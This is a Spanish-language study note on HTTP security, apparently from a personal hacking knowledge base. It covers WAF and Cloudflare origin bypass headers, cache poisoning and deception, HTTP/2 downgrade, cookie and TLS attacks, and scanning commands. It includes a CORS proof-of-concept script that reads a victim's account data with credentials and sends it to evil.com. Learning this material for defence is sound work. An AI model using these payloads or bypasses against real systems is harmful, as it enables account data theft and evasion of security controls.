---
title: "HTTP Profundo"
type: note
status: active
tags:
  - seguridad
  - http
  - web
  - fundamentos
aliases:
  - HTTP Deep Dive
  - Protocolo HTTP
created: 2026-06-13
updated: 2026-06-13
---

# HTTP Profundo

> [!INFO] Fuente
> RFC 7230-7235 (HTTP/1.1), RFC 7540 (HTTP/2), RFC 9113 (HTTP/3), PortSwigger.

---

## Request HTTP completa

```
METODO /ruta?query=param HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Accept: text/html,application/json
Accept-Language: es-AR,es;q=0.9
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: session=abc123
X-Forwarded-For: 127.0.0.1

body_content
```

Cada linea tiene significado y potencial para un ataque.

---

## Tecnicas de evasion

### IP Origin Bypass

Cuando un sitio detras de Cloudflare solo permite ciertas IPs:

```bash
# Encontrar IP real via Shodan
curl -s https://www.shodan.io/host/{ip}

# Probar acceso directo
curl -H "Host: target.com" http://{real_ip}

# Historical DNS
curl https://securitytrails.com/domain/target.com/history
```

### WAF Bypass via headers

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

### HTTP Method Override

```http
POST /api/user/delete HTTP/1.1
X-HTTP-Method-Override: DELETE
Content-Type: application/x-www-form-urlencoded

user_id=123
```

---

## Caching y CDN

### Cache Poisoning

```http
# Si el CDN cachea basado en Host header
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Respuesta con URLs absolutas → apuntan a evil.com
# Siguientes usuarios reciben la version envenenada
```

### Cache Deception

```
/account/settings/nonexistent.css
# Si el proxy cachea .css pero el server trata /account primero
# La pagina sensible se cachea en el CDN, accesible publicamente
```

### CDN Fingerprinting

| CDN | Identificador |
|-----|---------------|
| Cloudflare | Header `cf-ray`, `server: cloudflare` |
| Cloudfront | Header `x-amz-cf-id`, `x-amz-cf-pop` |
| Akamai | Header `x-akamai-*` |
| Fastly | Header `x-served-by`, `x-cache` |
| CloudFlare (origin) | `nslookup target.com` → IPs de Cloudflare |

---

## HTTP/2 y HTTP/3

### Diferencias clave para hacking

| Caracteristica | HTTP/1.1 | HTTP/2 | HTTP/3 |
|----------------|----------|--------|--------|
| Formato | Texto | Binario | Binario |
| Multiplexing | No | Si | Si |
| Headers comprimidos | No | HPACK | QPACK |
| Transporte | TCP | TCP | QUIC (UDP) |
| Server Push | No | Si | Si |

### Implicaciones

- **HTTP/2**: Request smuggling es diferente, algunos ataques de HTTP/1.1 no funcionan
- **HTTP/3**: Usa QUIC sobre UDP, no se puede interceptar tan facil con proxies clasicos
- **HTTP/2 Downgrade**: Si forzas HTTP/1.1, podes evadir WAFs que solo inspeccionan HTTP/2

```bash
# Forzar HTTP/1.1
curl --http1.1 https://target.com

# Ver que soporta
curl -v --http2 https://target.com 2>&1 | grep -i "h2"
```

---

## CORS en profundidad

### Cabeceras CORS

```
Access-Control-Allow-Origin: https://trusted.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type
Access-Control-Max-Age: 3600
```

### Lo que buscas

| Escenario | Riesgo |
|-----------|--------|
| `ACAO: *` con `credentials: true` | Cualquier sitio puede leer la respuesta |
| `ACAO: null` | `null` origin (sandbox iframe) puede acceder |
| `ACAO` refleja Origin sin validacion | Basta enviar `Origin: evil.com` |
| Preflight sin auth | Metodos como PUT/DELETE sin proteccion |

### PoC para CORS misconfig

```html
<html>
<body>
<script>
fetch('https://target.com/api/user/me', {
  credentials: 'include'
}).then(r => r.text()).then(d => {
  fetch('https://evil.com/steal?data=' + btoa(d))
})
</script>
</body>
</html>
```

---

## Cookies y Sesiones

### Flags de cookies

```
Set-Cookie: session=abc123; 
  Domain=.target.com;        # A que dominio va
  Path=/;                     # A que ruta
  HttpOnly;                   # No accesible via JS
  Secure;                     # Solo HTTPS
  SameSite=Lax;               # Previene CSRF en POST
  SameSite=Strict;            # Previene CSRF en todo
  SameSite=None;              # Enviada en cross-site (requiere Secure)
  Max-Age=3600;               # Tiempo de vida
```

### Ataques a sesiones

| Ataque | Descripcion |
|--------|-------------|
| Session Fixation | Forzar una sesion conocida en la victima |
| Session Prediction | Predecir el valor de la cookie (timestamp, hash debil) |
| Cookie tossing | Si el dominio permite subdominios, setear cookie en `.target.com` |
| Insecure cookie | Cookie sin Secure enviada en HTTP → capturable en red local |

---

## TLS/SSL

### Conexion TLS

```
1. Client Hello (versiones, cipher suites soportados)
2. Server Hello (certificado, cipher elegido)
3. Key Exchange (Diffie-Hellman, RSA)
4. Cambio a cifrado
5. Handshake completo → datos cifrados
```

### Ataques TLS

| Ataque | Descripcion |
|--------|-------------|
| SSL Stripping | Downgrade de HTTPS a HTTP via MITM |
| Weak Ciphers | Forzar uso de cifrado debil (RC4, DES) |
| Expired Certificate | Posible MITM si usuario acepta |
| Self-signed cert | Lo mismo |
| Heartbleed (CVE-2014-0160) | Leer memoria del servidor |
| ROBOT attack | Oracle RSA |

```bash
# Verificar TLS
nmap --script ssl-enum-ciphers -p 443 target.com
testssl.sh target.com
curl -v https://target.com --cipher 'RC4'  # Si acepta, es debil
```

---

## Ver tambien

- [[SEGURIDAD/Fundamentos Redes]]
- [[SEGURIDAD/Linux para Hacking]]
- [[SEGURIDAD/Vulnerabilidades Web]]
- [[SEGURIDAD/Hacking Activo]]
- [[SEGURIDAD/00 - INDICE]]
